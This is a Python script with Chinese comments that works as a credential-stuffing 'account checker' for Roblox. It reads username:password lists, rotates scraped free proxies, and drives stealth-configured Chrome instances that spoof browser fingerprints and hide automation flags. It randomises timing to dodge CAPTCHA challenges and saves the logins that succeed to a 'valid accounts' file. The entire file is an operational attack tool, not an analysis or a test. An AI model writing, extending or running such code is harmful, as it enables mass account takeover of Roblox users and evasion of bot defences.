import os
import time
import random
import requests
import json
import atexit
import psutil
import tkinter as tk
from tkinter import filedialog
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium_stealth import stealth
from colorama import Fore, init
from concurrent.futures import ThreadPoolExecutor

init(autoreset=True)
magenta, red, green, reset, cyan, yellow = Fore.MAGENTA, Fore.RED, Fore.GREEN, Fore.RESET, Fore.CYAN, Fore.YELLOW

# --- 配置 ---
CHECKED_FILE = "checked_accounts.txt"
GOOD_FILE = "valid_accounts.txt"
MAX_WORKERS = 3  # 視窗並行數
ACTIVE_DRIVERS = []

# --- 系統清理功能 ---
def cleanup():
    print(f"\n{yellow}[系統] 正在強制關閉所有背景瀏覽器進程...{reset}")
    for driver in ACTIVE_DRIVERS:
        try: driver.quit()
        except: pass
    current_process = psutil.Process()
    for child in current_process.children(recursive=True):
        try:
            if "chrome" in child.name().lower() or "chromedriver" in child.name().lower():
                child.terminate()
        except: pass
    print(f"{green}[系統] 清理完畢。{reset}")

atexit.register(cleanup)

# --- 1. 代理抓取與預選 ---
def get_clean_proxy_list():
    print(f"[*] {cyan}正在從 free-proxy-list.net 抓取最新代理...{reset}")
    try:
        resp = requests.get("https://free-proxy-list.net/", timeout=10)
        rows = resp.text.split("<tbody>")[1].split("</tbody>")[0].split("<tr>")[1:]
        raw = [f"{r.split('</td>')[0].split('>')[-1]}:{r.split('</td>')[1].split('>')[-1]}" for r in rows if "yes" in r]
        
        def verify(p):
            try:
                # 測試代理連線品質
                r = requests.get("https://users.roblox.com/v1/users/1", proxies={"http":f"http://{p}","https":f"http://{p}"}, timeout=5)
                return p if r.status_code == 200 else None
            except: return None
        
        print(f"[*] {cyan}正在篩選高品質代理 (這可能需要一點時間)...{reset}")
        with ThreadPoolExecutor(max_workers=30) as ex:
            valid = [r for r in list(ex.map(verify, raw)) if r]
        return valid if valid else [None]
    except Exception as e:
        print(f"{red}[!] 代理抓取失敗: {e}{reset}")
        return [None]

# --- 2. 建立純淨隱身瀏覽器 ---
def create_pure_stealth_driver(proxy=None, thread_id=0):
    options = webdriver.ChromeOptions()
    # 隨機解析度模擬不同裝置
    w, h = random.randint(1024, 1366), random.randint(768, 900)
    options.add_argument(f"--window-size={w},{h}")
    options.add_argument("--blink-settings=imagesEnabled=false") # 禁用圖片
    options.add_argument("--mute-audio")
    
    # 移除自動化偵測特徵
    options.add_experimental_option("excludeSwitches", ["enable-automation", "enable-logging"])
    options.add_experimental_option('useAutomationExtension', False)
    
    if proxy:
        options.add_argument(f'--proxy-server={proxy}')
    
    service = Service(executable_path="chromedriver.exe")
    driver = webdriver.Chrome(service=service, options=options)
    ACTIVE_DRIVERS.append(driver)
    
    # 注入偽裝指紋
    stealth(driver,
        languages=["zh-TW", "en-US"],
        vendor="Google Inc.",
        platform="Win32",
        webgl_vendor=random.choice(["Intel Inc.", "NVIDIA Corporation"]),
        renderer=random.choice(["Intel Iris OpenGL Engine", "GeForce RTX 3060"]),
        fix_hairline=True,
    )
    return driver

# --- 3. 核心檢查邏輯 ---
def process_account(account_info, proxy, thread_id, total_pending):
    user, pw = account_info.split(":", 1)
    driver = None
    log_prefix = f"[{magenta}視窗#{thread_id}{reset}]"
    
    try:
        print(f"{log_prefix} {cyan}準備檢查: {user} | 使用 IP: {proxy}{reset}")
        driver = create_pure_stealth_driver(proxy, thread_id)
        
        # 訪問頁面
        print(f"{log_prefix} 正在加載 Roblox 登入頁面...")
        driver.get("https://www.roblox.com/Login")
        
        # 顯式等待
        wait = WebDriverWait(driver, 45)
        user_field = wait.until(EC.presence_of_element_located((By.ID, "login-username")))
        
        print(f"{log_prefix} 正在輸入帳號密碼...")
        user_field.send_keys(user)
        driver.find_element(By.ID, "login-password").send_keys(pw)
        
        # JS 強制點擊 (防止橫幅遮擋)
        login_btn = driver.find_element(By.ID, "login-button")
        driver.execute_script("arguments[0].click();", login_btn)
        
        print(f"{log_prefix} {yellow}已點擊登入，等待跳轉或驗證碼結果...{reset}")
        
        # 循環監控狀態
        start_time = time.time()
        while time.time() - start_time < 90: # 最多等待 90 秒
            curr_url = driver.current_url
            page_text = driver.page_source
            
            if "home" in curr_url or "dashboard" in curr_url:
                print(f"{log_prefix} {green}[+成功] {user} 登入成功！{reset}")
                with open(GOOD_FILE, "a") as f: f.write(f"{account_info}\n")
                with open(CHECKED_FILE, "a") as f: f.write(f"{account_info}\n")
                return
            
            elif "Invalid" in page_text or driver.find_elements(By.ID, "login-form-error"):
                print(f"{log_prefix} {red}[-失敗] {user} 密碼錯誤。{reset}")
                with open(CHECKED_FILE, "a") as f: f.write(f"{account_info}\n")
                return
            
            elif "Unknown error" in page_text:
                print(f"{log_prefix} {yellow}[!] 遭遇未知錯誤 (IP Blocked)，放棄此 IP。{reset}")
                return
            
            elif "Verification" in page_text or "挑戰" in page_text:
                # 這裡你可以手動解，或是等它超時換 IP
                elapsed = int(time.time() - start_time)
                print(f"{log_prefix} {yellow}卡在驗證碼介面 (已等待 {elapsed}s)...{reset}", end="\r")
            
            time.sleep(5)
            
        print(f"{log_prefix} {red}[超時] {user} 檢查時間過長，自動跳過。{reset}")

    except Exception as e:
        err_type = type(e).__name__
        print(f"{log_prefix} {red}執行異常 ({err_type})，已釋放視窗。{reset}")
    finally:
        if driver:
            try:
                ACTIVE_DRIVERS.remove(driver)
                driver.quit()
            except: pass

# --- 4. 主程式控制 ---
def main():
    root = tk.Tk(); root.withdraw()
    print(f"[*] {cyan}請選擇已整理的帳號名單 (.txt)...{reset}")
    file_path = filedialog.askopenfilename()
    if not file_path: return

    with open(file_path, "r", encoding="utf-8") as f:
        all_accs = [line.strip() for line in f if ":" in line]

    # 讀取進度
    checked_set = set()
    if os.path.exists(CHECKED_FILE):
        with open(CHECKED_FILE, "r") as f:
            checked_set = {line.strip() for line in f}

    pending = [a for a in all_accs if a not in checked_set]
    total_count = len(pending)
    print(f"[*] {green}名單讀取成功！待檢查數量: {total_count}{reset}")

    proxies = get_clean_proxy_list()
    p_count = len(proxies)

    print(f"[*] {yellow}啟動並行引擎 (視窗數: {MAX_WORKERS})...{reset}\n")

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        for i, acc in enumerate(pending):
            # 分配線程 ID (1~MAX_WORKERS) 供日誌顯示
            t_id = (i % MAX_WORKERS) + 1
            current_proxy = proxies[i % p_count]
            
            executor.submit(process_account, acc, current_proxy, t_id, total_count)
            
            # [重要] 啟動間隔隨機化，避免集體請求導致集體挑戰
            time.sleep(random.randint(12, 25))

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{red}[!] 用戶手動中斷程式。{reset}")
        cleanup()